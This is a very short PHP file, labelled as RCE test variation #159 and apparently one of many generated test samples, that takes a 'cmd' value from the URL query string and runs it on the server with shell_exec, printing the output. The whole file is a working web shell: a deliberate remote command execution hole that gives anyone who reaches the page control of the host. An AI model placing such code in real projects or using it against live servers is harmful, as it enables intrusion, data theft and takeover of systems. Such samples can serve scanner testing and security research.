<?php
// RCE test variation #159
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>